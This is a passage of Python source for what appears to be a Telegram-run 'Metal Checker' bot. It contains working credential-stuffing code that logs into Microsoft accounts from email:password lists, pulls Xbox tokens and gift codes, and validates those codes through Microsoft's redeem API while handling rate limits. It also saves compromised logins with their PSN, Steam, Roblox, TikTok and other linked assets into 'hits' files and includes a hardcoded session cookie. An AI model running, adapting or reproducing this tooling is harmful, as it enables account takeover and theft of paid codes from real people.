                    "Cookie": "MSPRequ=id=N&lt=1761964181&co=1; uaid=f8aac2614ca54994b0bb9621af361fe6; MSCC=110.226.176.161-IN; MSPOK=$uuid-28da118b-591b-4245-a835-d6a7a6516fc6; OParams=11O.DtU8h4PuH7vnv3smo7N1*styCuvoTV2MRZi8wj4oQDgi!Mpw6KZwEGt9RgLvxFZ*vwFA!0!1OLGPdeGOwX9EAmOhMaLVWgPa3!lut3b6iSqLZwZ6wKNo48s9Glp9oJNYOJ!QdDvn9Zlz6yUfmGNA71N*7RJJ82DhAEUtv9cj3S5VSLPp*rLjsZw*T!eA4rT1OoHQfj!E0MpIMb7XTGunq0W296qtBwcXcMiKnoG1DOOam7ArRr9kSeVqb2OO3gQ8tBcGfef*aveFCKUAbkdjWuhRB4vYl2RmUA5yc967445z!g761lZOAEaXxAMTGxbEibxTneHDX4PpnqWIwURKn*igMH7p7LRvIUh0TPAO2ff6h793xvhtYi3SYKj4gT6KaajxfJ3fL0Ceb*308Ner9hi32b2GVnW81LmKcQLF343cM0KcKgRXBqkPdIJ3fS*4l8wFshd1kpI0elXVUgQ9A5a4tPKO46vh9k*luyC!RSNjzNs4oQKLFF1TXRB1LifVMLwKQ3aJTxxys!YvalzEB5q6TG*bKZ1FDBjFfpSIEVdfg8XMOBszi3TGeXJw*sg5zsSVv9Efpe3UfEvAgAr24Qk*fYd2G0FdzrNpxb9nntPSX*TYsh2k5EYuW9RD6qo!qtSh8EXzTq0WS6qII0*Tkn*NxydUx3WPbZ2fiOU*ulkS8TlhUKRRbNNTMeYIWl93GOeP9cIuXtFuZ3XZimHUgv86pjFVxKXeDCVQpyOjVUSL67AuADB0ukQBYlw7z48cv0Q5XlXX4umkZErVDo5f9W4uE1mTaav!WpKqighrUL2Me5Uqexr*RCtwpDu1f5W1ay0xmPoxx*W5lIIQUmKYua93KiFQsxnma3iHtSaH2tUeClZaWauWKkBt5xwyZ3ajhyWT4Ylw8lfDgf0RNWQhdrQ6EVtXowflqyiWC71dfjUDqVnSCzTcUuZCX*Hzkewo5G3LZczEm1MeuQRPMFisXNkf3KSBgzwqlyt8rHQrNYzuZRMTyO9WGt1RS1kTDs1XNu3PG8qA1HWTq7kwHvKeVblEr!!YGoUFWaWWsQqLa0Co7x83jzWgGDTOa3NFawXQGsA5snh7HsS01WqUHgCtHT9RKRegHay9aO813K5jayLc3UR9qO2mspBZhSKuaYPOoaNUeoF5ImgWitT*g1ogFFJl12AgfmtEVWDVhzmvtR1j7oNlvEE2g0fu0SMo!NTV3zbWjxfN!F1b6UxCV0uFT7QTf8yL2M4Lw8CnCTWa5N*jc2SSZe4O2SU*2HPHn0lYFOUkGGoXTe2pHGQiW0hA8jFnufIOzjTZ0VLEA7Z6QlW62lkpDEW9OXmUdqRmp225Ag$$"
                },
                allow_redirects=True, timeout=30
            )
            login_request = login_response.text.replace('\\', '')
            reurl_match = re.search(r'replace\(\"([^\"]+)\"', login_request)
            if not reurl_match: return None
            reurl = reurl_match.group(1)
            
            try: reresp = session.get(reurl, timeout=30).text
            except: return None
                
            actch = re.search(r'<form.*?action="(.*?)".*?>', reresp)
            if not actch: return None
            acu = actch.group(1)
            input_matches = re.findall(r'<input.*?name="(.*?)".*?value="(.*?)".*?>', reresp)
            fta = {name: value for name, value in input_matches}
            
            try:
                final_response = session.post(acu, data=fta, allow_redirects=True, timeout=30)
                if final_response.status_code != 200: return None
            except: return None
            return session
        except: return None

    def get_auth_token(self, session, force_refresh=False):
        try:
            if not force_refresh and hasattr(session, 'wlid_token'): return session.wlid_token
            session.get("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", timeout=10)
            token_headers = {
                'Accept': 'application/json', 'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache',
                'Pragma': 'no-cache', 'Referer': 'https://account.microsoft.com/billing/redeem'
            }
            token_response = session.get(
                'https://account.microsoft.com/auth/acquire-onbehalf-of-token',
                params={'scopes': 'MSComServiceMBISSL'}, headers=token_headers, timeout=15
            )
            if token_response.status_code != 200: return None
            token_data = token_response.json()
            if not token_data or len(token_data) == 0: return None
            token = token_data[0]['token']
            session.wlid_token = token
            return token
        except: return None

    def get_store_cart_state(self, session, force_refresh=False):
        try:
            if force_refresh and hasattr(session, 'store_state'): delattr(session, 'store_state')
            if not force_refresh and hasattr(session, 'store_state'): return session.store_state
                
            token = self.get_auth_token(session, force_refresh)
            if not token: return None
            ms_cv = "xddT7qMNbECeJpTq.6.2"
            
            url = 'https://www.microsoft.com/store/purchase/buynowui/redeemnow'
            params = {'ms-cv': ms_cv, 'market': 'US', 'locale': 'en-GB', 'clientName': 'AccountMicrosoftCom'}
            payload = {'data': '{"usePurchaseSdk":true}', 'market': 'US', 'cV': ms_cv, 'locale': 'en-GB', 'msaTicket': token, 'pageFormat': 'full', 'urlRef': 'https://account.microsoft.com/billing/redeem', 'isRedeem': 'true', 'clientType': 'AccountMicrosoftCom', 'layout': 'Inline', 'cssOverride': 'AMC', 'scenario': 'redeem', 'timeToInvokeIframe': '4977', 'sdkVersion': 'VERSION_PLACEHOLDER'}
            
            try: response = session.post(url, params=params, data=payload, timeout=30, allow_redirects=True)
            except: return None
                
            text = response.text
            match = re.search(r'window\.__STORE_CART_STATE__=({.*?});', text, re.DOTALL)
            if not match: return None
                
            try:
                store_state = json.loads(match.group(1))
                extracted_values = {
                    'ms_cv': store_state.get('appContext', {}).get('cv', ''),
                    'correlation_id': store_state.get('appContext', {}).get('correlationId', ''),
                    'tracking_id': store_state.get('appContext', {}).get('trackingId', ''),
                    'vector_id': store_state.get('appContext', {}).get('vectorId', ''),
                    'muid': store_state.get('appContext', {}).get('muid', ''),
                    'alternative_muid': store_state.get('appContext', {}).get('alternativeMuid', '')
                }
                session.store_state = extracted_values
                return extracted_values
            except json.JSONDecodeError: return None
        except: return None

    def validate_code_primary(self, session, code, force_refresh_ids=False):
        try:
            if not code or len(code) < 5 or ' ' in code or any(char in ['A', 'E', 'I', 'O', 'U', 'L', 'S', '0', '1', '5'] for char in code):
                return {"status": "INVALID", "message": "Invalid code format"}
            
            store_state = self.get_store_cart_state(session, force_refresh=force_refresh_ids)
            if not store_state:
                store_state = self.get_store_cart_state(session, force_refresh=True)
                if not store_state: return {"status": "ERROR", "message": "Failed to get store cart state"}
            
            token = self.get_auth_token(session, force_refresh=force_refresh_ids)
            if not token:
                token = self.get_auth_token(session, force_refresh=True)
                if not token: return {"status": "ERROR", "message": "Failed to get authentication token"}
            
            try:
                headers = {
                    "host": "buynow.production.store-web.dynamics.com", "connection": "keep-alive",
                    "x-ms-tracking-id": store_state['tracking_id'], "sec-ch-ua-platform": "\"Windows\"",
                    "authorization": f"WLID1.0=t={token}", "x-ms-client-type": "AccountMicrosoftCom",
                    "x-ms-market": "US", "ms-cv": store_state['ms_cv'], "x-ms-reference-id": self.generate_reference_id(),
                    "x-ms-vector-id": store_state['vector_id'],
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0",
                    "x-ms-correlation-id": store_state['correlation_id'], "content-type": "application/json",
                    "x-authorization-muid": store_state['alternative_muid'], "accept": "*/*",
                    "origin": "https://www.microsoft.com", "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.microsoft.com/",
                    "accept-encoding": "gzip, deflate, br, zstd", "accept-language": "en-US,en;q=0.9"
                }
                payload = {
                    "market": "US", "language": "en-US",
                    "flights": ["sc_abandonedretry","sc_addasyncpitelemetry","sc_adddatapropertyiap","sc_addgifteeduringordercreation","sc_aemparamforimage","sc_aemrdslocale","sc_allowalipayforcheckout","sc_allowbuynowrupay","sc_allowcustompifiltering","sc_allowelo","sc_allowfincastlerewardsforsubs","sc_allowmpesapi","sc_allowparallelorderload","sc_allowpaypay","sc_allowpaypayforcheckout","sc_allowpaysafecard","sc_allowpaysafeforus","sc_allowrupay","sc_allowrupayforcheckout","sc_allowsmdmarkettobeprimarypi","sc_allowupi","sc_allowupiforbuynow","sc_allowupiforcheckout","sc_allowupiqr","sc_allowupiqrforbuynow","sc_allowupiqrforcheckout","sc_allowvenmo","sc_allowvenmoforbuynow","sc_allowvenmoforcheckout","sc_allowverve","sc_analyticsforbuynow","sc_announcementtsenabled","sc_apperrorboundarytsenabled","sc_askaparentinsufficientbalance","sc_askaparentssr","sc_askaparenttsenabled","sc_asyncpiurlupdate","sc_asyncpurchasefailure","sc_asyncpurchasefailurexboxcom","sc_authactionts","sc_autorenewalconsentnarratorfix","sc_bankchallenge","sc_bankchallengecheckout","sc_blockcsvpurchasefrombuynow","sc_blocklegacyupgrade","sc_buynowfocustrapkeydown","sc_buynowglobalpiadd","sc_buynowlistpichanges","sc_buynowprodigilegalstrings","sc_buynowuipreload","sc_buynowuiprod","sc_cartcofincastle","sc_cartrailexperimentv2","sc_cawarrantytermsv2","sc_checkoutglobalpiadd","sc_checkoutitemfontweight","sc_checkoutredeem","sc_clientdebuginfo","sc_clienttelemetryforceenabled","sc_clienttorequestorid","sc_contactpreferenceactionts","sc_contactpreferenceupdate","sc_contactpreferenceupdatexboxcom","sc_conversionblockederror","sc_copycurrentcart","sc_cpdeclinedv2","sc_culturemarketinfo","sc_cvvforredeem","sc_dapsd2challenge","sc_delayretry","sc_deliverycostactionts","sc_devicerepairpifilter","sc_digitallicenseterms","sc_disableupgradetrycheckout","sc_discountfixforfreetrial","sc_documentrefenabled","sc_eligibilityapi","sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonenumber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
                    "tokenIdentifierValue": code, "supportsCsvTypeTokenOnly": False, "buyNowScenario": "redeem",
                    "clientContext": {"client": "AccountMicrosoftCom", "deviceFamily": "Web"}
                }
                response = session.post(
                    'https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken',
                    headers=headers, json=payload, timeout=30
                )
                if not response: return {"status": "ERROR", "message": "Request failed"}
            except Exception as e: return {"status": "ERROR", "message": f"Request failed: {str(e)}"}
            
            if response.status_code == 429: return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
            if response.status_code != 200: return {"status": "ERROR", "message": f"Request failed with status {response.status_code}"}
                
            data = response.json()
            if "tokenType" in data and data["tokenType"] == "CSV":
                return {"status": "BALANCE_CODE", "message": f"{code} | {data.get('value')} {data.get('currency')}"}
            
            if "errorCode" in data and data["errorCode"] == "TooManyRequests":
                return {"status": "RATE_LIMITED", "message": "Account rate limited (TooManyRequests)"}
            
            if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
                cart_event = data["events"]["cart"][0]
                if "data" in cart_event and "reason" in cart_event["data"]:
                    reason = cart_event["data"]["reason"]
                    if "TooManyRequests" in reason or "RateLimit" in reason: return {"status": "RATE_LIMITED", "message": f"Account rate limited ({reason})"}
                    if reason == "RedeemTokenAlreadyRedeemed": return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                    elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"]: return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                    elif reason == "RedeemTokenStateDeactivated": return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                    elif reason == "RedeemTokenGeoFencingError": return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                    elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]: return {"status": "INVALID", "message": f"{code} | INVALID"}
                    else: return {"status": "INVALID", "message": f"{code} | INVALID"}
            
            if "products" in data and len(data["products"]) > 0:
                product_info = data.get("productInfos", [{}])[0]
                product_id = product_info.get("productId")
                for product in data["products"]:
                    if product.get("id") == product_id:
                        product_title = product.get("sku", {}).get("title", product.get("title", "Unknown Title"))
                        is_pi_required = product_info.get("isPIRequired", False)
                        return {
                            "status": "VALID_REQUIRES_CARD" if is_pi_required else "VALID",
                            "product_title": product_title, "message": f"{code} | {product_title}"
                        }
            return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
        except Exception as e: return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}

    def extract_game_type(self, game_name):
        game_name = game_name.upper()
        if 'SUNSET SARSAPARILLA' in game_name: return '🥤 Sunset Sarsaparilla Bundle'
        elif 'RAINBOW SIX SIEGE' in game_name: return '🔫 Rainbow Six Siege'
        elif 'SKATE' in game_name: return '🛹 Skate Supercharge Pack'
        elif 'MADDEN NFL' in game_name: return '🏈 Madden NFL Supercharge Pack'
        elif 'WARFRAME' in game_name: return '⚔️ Warframe Bundle'
        elif 'THRONE AND LIBERTY' in game_name: return '👑 Throne and Liberty'
        elif 'DRIFT BUNDLE' in game_name: return '🚗 Drift Bundle'
        elif 'WINTER' in game_name and 'XBOX BENEFITS' in game_name: return '❄️ Winter Xbox Benefits Pack'
        elif 'JANG SAO' in game_name: return '🏆 Jang Sao Champions Bundle'
        elif 'PSO2:NGS' in game_name or 'PHANTASY STAR' in game_name: return '⭐ PSO2:NGS Monthly Bonus'
        elif 'XBOX GAME PASS' in game_name: return '🎮 Xbox Game Pass'
        elif 'BUNDLE' in game_name: return '🎁 Game Bundle'
        elif 'PACK' in game_name: return '📦 Game Pack'
        else: return '🎮 Other Games'

    def format_game_codes_output(self, game_groups):
        lines = []
        sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
        lines.append("🎮 SORTED GAME CODES 🎮")
        lines.append("=" * 60)
        lines.append("")
        total_codes = 0
        for game_type, codes_list in sorted_groups:
            count = len(codes_list)
            total_codes += count
            lines.append(f"📋 {game_type} ({count} codes)")
            lines.append("-" * 50)
            codes_list.sort(key=lambda x: x[0])
            code_counts = {}
            for code, game_name in codes_list:
                if code not in code_counts: code_counts[code] = []
                code_counts[code].append(game_name)
            for code, game_names in sorted(code_counts.items()):
                if len(game_names) == 1: lines.append(f"{code} | {game_names[0]}")
                else:
                    lines.append(f"{code} (x{len(game_names)}) | {game_names[0]}")
                    for i, game_name in enumerate(game_names[1:], 1): lines.append(f"{' ' * (len(code) + 3)}| {game_name}")
            lines.append("")
        lines.append("📊 SUMMARY")
        lines.append("=" * 60)
        lines.append(f"Total unique codes: {len(code_counts) if 'code_counts' in locals() else 0}")
        lines.append(f"Total code entries: {total_codes}")
        lines.append(f"Game categories: {len(game_groups)}")
        return "\n".join(lines) + "\n"

# -----------------------------------------
# RESULT MANAGER & LIVE UI
# -----------------------------------------
class ResultManager:
    def __init__(self, chat_id, mode_name):
        self.chat_id = chat_id
        self.mode = mode_name
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
        self.base_folder = f"results_{chat_id}_{timestamp}"
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        
        # Checker Dosyaları
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
        self.active_subs = os.path.join(self.base_folder, "active_subs.txt")
        self.expired_subs = os.path.join(self.base_folder, "expired_subs.txt")
        self.psn_file = os.path.join(self.base_folder, "psn_hits.txt")
        self.steam_file = os.path.join(self.base_folder, "steam_hits.txt")
        self.supercell_file = os.path.join(self.base_folder, "supercell_hits.txt")
        self.tiktok_file = os.path.join(self.base_folder, "tiktok_hits.txt")
        self.minecraft_file = os.path.join(self.base_folder, "minecraft_hits.txt")
        self.roblox_file = os.path.join(self.base_folder, "roblox_hits.txt")
        
        # Code Manager Dosyaları
        self.fetched_codes_file = os.path.join(self.base_folder, "fetched_codes.txt")
        self.valid_codes_file = os.path.join(self.base_folder, "valid_codes.txt")
        self.invalid_codes_file = os.path.join(self.base_folder, "invalid_codes.txt")
        self.sorted_codes_file = os.path.join(self.base_folder, "sorted_codes.txt")
        
    def save_hit(self, res):
        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
        email, password = res['email'], res['password']
        base_str = f"{email}:{password}"
        with open(self.hits_file, 'a', encoding='utf-8') as f: f.write(base_str + "\n")
            
        if self.mode in ["microsoft", "both"]:
            subs = res.get("subscriptions", [])
            if subs:
                has_active = any(not s.get('is_expired', False) and s.get('days_remaining', '?') != '?' for s in subs)
                line = f"{base_str} | " + " | ".join([f"[{s.get('name', 'SUB')} - Days: {s.get('days_remaining', '?')}]" for s in subs])
                target_file = self.active_subs if has_active else self.expired_subs
                with open(target_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
                
        if self.mode in ["psn", "both"] and res.get("psn_orders", 0) > 0:
            purchases = res.get("psn_purchases", [])
            items = ", ".join([p.get('item', 'Unknown') for p in purchases[:3]])
            with open(self.psn_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Orders: {res['psn_orders']} | Games: {items}\n")
                
        if self.mode in ["steam", "both"] and res.get("steam_count", 0) > 0:
            games = ", ".join([p.get('game', 'Unknown') for p in res.get("steam_purchases", [])[:3]])
            with open(self.steam_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Purchases: {res['steam_count']} | {games}\n")
                
        if self.mode in ["supercell", "both"] and res.get("supercell_games"):
            with open(self.supercell_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Games: {', '.join(res['supercell_games'])}\n")
                
        if self.mode in ["tiktok", "both"] and res.get("tiktok_username"):
            with open(self.tiktok_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Username: @{res['tiktok_username']}\n")
                
        if self.mode in ["minecraft", "both"] and res.get("minecraft_username"):
            with open(self.minecraft_file, 'a', encoding='utf-8') as f: f.write(f"{base_str} | Username: {res['minecraft_username']}\n")
                
        if self.mode in ["roblox", "both"] and res.get("roblox_status") == "LINKED":
            rbx = res.get("roblox_data", {})
            wearing_str = ", ".join(rbx.get("wearing", []))
            line = f"{base_str} | Username = {rbx.get('username')} | Friends = {rbx.get('friends')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Wearing = [{wearing_str}]"
            with open(self.roblox_file, 'a', encoding='utf-8') as f: f.write(line + "\n")

    def save_2fa(self, email, password):
        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
        with open(self.two_fa_file, 'a', encoding='utf-8') as f: f.write(f"{email}:{password}\n")

    def save_code_result(self, code_line, result_type="fetched"):
        target_file = {
            "fetched": self.fetched_codes_file, "valid": self.valid_codes_file, 
            "invalid": self.invalid_codes_file, "sorted": self.sorted_codes_file
        }.get(result_type, self.fetched_codes_file)
        
        with open(target_file, 'a', encoding='utf-8') as f:
            f.write(code_line + "\n")

    def get_delivery_files(self):
        if self.mode == "both":
            zip_name = f"{self.base_folder}.zip"
            shutil.make_archive(self.base_folder, 'zip', self.base_folder)
            return [zip_name], True
        elif self.mode == "code_fetch":
            dest = "fetched_codes.txt"
            if os.path.exists(self.fetched_codes_file):
                shutil.copy(self.fetched_codes_file, dest)
                return [dest], False
            return [], False
        elif self.mode == "code_fetch_val":
            dest = "valid_codes.txt"
            if os.path.exists(self.valid_codes_file):
                shutil.copy(self.valid_codes_file, dest)
                return [dest], False
            return [], False
        else:
            files_to_send = []
            if self.mode == "microsoft":
                if os.path.exists(self.active_subs): files_to_send.append(self.active_subs)
                if os.path.exists(self.expired_subs): files_to_send.append(self.expired_subs)
            elif self.mode == "psn" and os.path.exists(self.psn_file): files_to_send.append(self.psn_file)
            elif self.mode == "steam" and os.path.exists(self.steam_file): files_to_send.append(self.steam_file)
            elif self.mode == "supercell" and os.path.exists(self.supercell_file): files_to_send.append(self.supercell_file)
            elif self.mode == "tiktok" and os.path.exists(self.tiktok_file): files_to_send.append(self.tiktok_file)
            elif self.mode == "minecraft" and os.path.exists(self.minecraft_file): files_to_send.append(self.minecraft_file)
            elif self.mode == "roblox" and os.path.exists(self.roblox_file): files_to_send.append(self.roblox_file)
            
            if not files_to_send and os.path.exists(self.hits_file): files_to_send.append(self.hits_file)
            return files_to_send, False


class LiveStats:
    def __init__(self, total, chat_id, mode):
        self.chat_id = chat_id
        self.total = total
        self.mode = mode
        self.checked = 0
        self.hits = 0
        self.two_fa = 0
        self.bads = 0
        
        self.ms_premium = 0
        self.ms_expired = 0
        self.psn_hits = 0
        self.steam_hits = 0
        self.sc_hits = 0
        self.mc_hits = 0
        self.tk_hits = 0
        self.rbx_hits = 0
        
        self.fetched_codes = 0
        self.valid_codes = 0
        self.invalid_codes = 0
        
        self.latest_active_subs = deque(maxlen=3)
        self.latest_games = deque(maxlen=3)
        self.latest_roblox = deque(maxlen=3)
        self.latest_codes = deque(maxlen=5)
        
        self.start_time = time.time()
        self.lock = Lock()
        self.message_id = None
        
    def update(self, status, res=None):
        with self.lock:
            self.checked += 1
            if status == "HIT":
                self.hits += 1
                if res:
                    subs = res.get("subscriptions", [])
                    active_subs = [s for s in subs if not s.get('is_expired', False)]
                    if active_subs:
                        self.ms_premium += 1
                        for s in active_subs: self.latest_active_subs.append(s.get('name', 'Unknown Sub'))
                    elif subs: self.ms_expired += 1
                        
                    if res.get("psn_orders", 0) > 0: 
                        self.psn_hits += 1
                        if res.get("psn_purchases"): self.latest_games.append(res["psn_purchases"][0].get('item', 'Game'))
                    if res.get("steam_count", 0) > 0: 
                        self.steam_hits += 1
                        if res.get("steam_purchases"): self.latest_games.append(res["steam_purchases"][0].get('game', 'Game'))
                    if res.get("supercell_games"): self.sc_hits += 1
                    if res.get("tiktok_username"): self.tk_hits += 1
                    if res.get("minecraft_username"): self.mc_hits += 1
                    if res.get("roblox_status") == "LINKED":
                        self.rbx_hits += 1
                        self.latest_roblox.append(res.get("roblox_data", {}).get("username", "Unknown"))
            elif status == "2FA": self.two_fa += 1
            else: self.bads += 1

    def update_codes(self, fetched_count=0, valid_str=None, invalid_count=0):
        with self.lock:
            if fetched_count > 0: self.fetched_codes += fetched_count
            if valid_str:
                self.valid_codes += 1
                self.latest_codes.append(valid_str)
            if invalid_count > 0: self.invalid_codes += invalid_count

    def generate_text(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.checked / elapsed * 60) if elapsed > 0 else 0
            progress = (self.checked / self.total * 100) if self.total > 0 else 0
            
            if self.mode in ["code_fetch", "code_fetch_val"]:
                text = f"⚙️ *METAL CODES - LIVE ENGINE* ⚙️\n"
                text += f"━━━━━━━━━━━━━━━━━━━━\n"
                text += f"📥 *Accounts Checked:* `{self.checked}/{self.total}`\n"
                text += f"🟢 *Total Codes Fetched:* `{self.fetched_codes}`\n"
                if self.mode == "code_fetch_val":
                    text += f"✅ *Valid Codes:* `{self.valid_codes}`\n"
                    text += f"❌ *Invalid/Expired:* `{self.invalid_codes}`\n"
                    if self.latest_codes:
                        text += f"🔥 *Latest Valid Codes:*\n"
                        for c in list(self.latest_codes): text += f"  `{c}`\n"
                text += f"━━━━━━━━━━━━━━━━━━━━\n"
                text += f"🚀 *CPM:* `{int(cpm)}` | ⏱ *Elapsed:* `{int(elapsed)}s`\n"
                return text

            text = f"⚙️ *METAL CHECKER - LIVE RESULTS* ⚙️\n"
            text += f"━━━━━━━━━━━━━━━━━━━━\n"
            text += f"🟢 *Hits:* `{self.hits}` | 🟡 *2FA:* `{self.two_fa}` | 🔴 *Bad:* `{self.bads}`\n"
            text += f"━━━━━━━━━━━━━━━━━━━━\n"
            
            if self.mode in ["microsoft", "both"]:
                text += f"🎮 *Active Subs:* `{self.ms_premium}` | 💀 *Expired:* `{self.ms_expired}`\n"
                if self.latest_active_subs: text += f"🔥 *Latest:* `{', '.join(list(self.latest_active_subs))}`\n"
                
            if self.mode in ["psn", "steam", "both"]:
                if self.mode in ["psn", "both"]: text += f"🎯 *PSN:* `{self.psn_hits}`\n"
                if self.mode in ["steam", "both"]: text += f"🎲 *Steam:* `{self.steam_hits}`\n"
                
            if self.mode in ["supercell", "tiktok", "minecraft", "roblox", "both"]:
                if self.mode in ["supercell", "both"]: text += f"⚔️ *Supercell:* `{self.sc_hits}`\n"
                if self.mode in ["tiktok", "both"]: text += f"📱 *TikTok:* `{self.tk_hits}`\n"
                if self.mode in ["minecraft", "both"]: text += f"⛏️ *Minecraft:* `{self.mc_hits}`\n"
                if self.mode in ["roblox", "both"]: text += f"🟥 *Roblox:* `{self.rbx_hits}`\n"
                
            text += f"━━━━━━━━━━━━━━━━━━━━\n"
            text += f"📊 *Progress:* `{self.checked}/{self.total} ({progress:.1f}%)`\n"
            text += f"🚀 *CPM:* `{int(cpm)}`\n"
            return text

# -----------------------------------------
# 3. BACKGROUND PROCESS RUNNERS FOR CODES
# -----------------------------------------
def run_code_operations(chat_id, accounts, config):
    try:
        total_accounts = len(accounts)
        result_mgr = ResultManager(chat_id, config["mode"])
        stats = LiveStats(total_accounts, chat_id, config["mode"])
        
        msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
        stats.message_id = msg.message_id
        
        def ui_updater():
            while active_tasks.get(chat_id, False):
                time.sleep(3.0)
                if not active_tasks.get(chat_id, False): break 
                try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
                except: pass

        updater_thread = Thread(target=ui_updater)
        updater_thread.start()

        tools = XboxCodeTools()
        fetched_codes_list = []
        
        # 1. FETCH ASAMASI
        def fetch_worker(acc):
            if stop_flags.get(chat_id, False): return
            email, password = acc
            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0'})
            try:
                url_post, ppft = tools.fetch_oauth_tokens(session)
                if url_post:
                    rps = tools.fetch_login(session, email, password, url_post, ppft)
                    if rps:
                        uhs, xsts = tools.get_xbox_tokens(session, rps)
                        if uhs:
                            codes = tools.fetch_codes_from_xbox(session, uhs, xsts)
                            if codes:
                                stats.update_codes(fetched_count=len(codes))
                                for c in codes:
                                    fetched_codes_list.append(c)
                                    result_mgr.save_code_result(c, "fetched")
            except: pass
            finally:
                stats.update("CHECKED") # Sayac artsın diye dummy stat
                session.close()

        with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
            for account in accounts:
                if stop_flags.get(chat_id, False): break
                executor.submit(fetch_worker, account)

        # 2. VALIDATE ASAMASI (EGER ISTENDIYSE)
        if config["mode"] == "code_fetch_val" and fetched_codes_list and not stop_flags.get(chat_id, False):
            stats.checked = 0 # Sifirla ki validator tablosu baslasin
            stats.total = len(fetched_codes_list)
            
            # Kodları checklemek için tek bir valid hesap yakala (örneğin listedeki ilk çalışan hesap)
            val_session = None
            for e, p in accounts:
                val_session = tools.login_microsoft_account(e, p)
                if val_session: break
            
            if val_session:
                def validate_worker(code):
                    if stop_flags.get(chat_id, False): return
                    try:
                        res = tools.validate_code_primary(val_session, code)
                        status = res.get("status", "ERROR")
                        msg_str = res.get("message", code)
